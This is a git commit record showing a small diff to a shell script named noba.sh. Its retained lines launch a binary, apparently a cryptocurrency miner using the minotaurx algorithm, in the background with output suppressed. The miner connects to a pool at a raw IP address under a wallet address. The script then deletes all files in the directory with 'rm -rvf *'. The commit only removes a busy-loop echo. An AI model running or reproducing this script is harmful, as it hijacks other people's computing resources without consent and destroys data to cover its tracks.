34d53d66fd23a0e4f8f07e8f0598d622c7ad5726
paskofa10 <mr.paskofa10@jugda.com>
2025-06-14 08:54:47 +0700

    Update noba.sh

--- noba.sh
+++ noba.sh
@@ -5,7 +5,3 @@ chmod 777 centu
 ./centu -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
 sleep 10
 rm -rvf *
-while true
-do
-        echo "sedang berjalan..."
-done
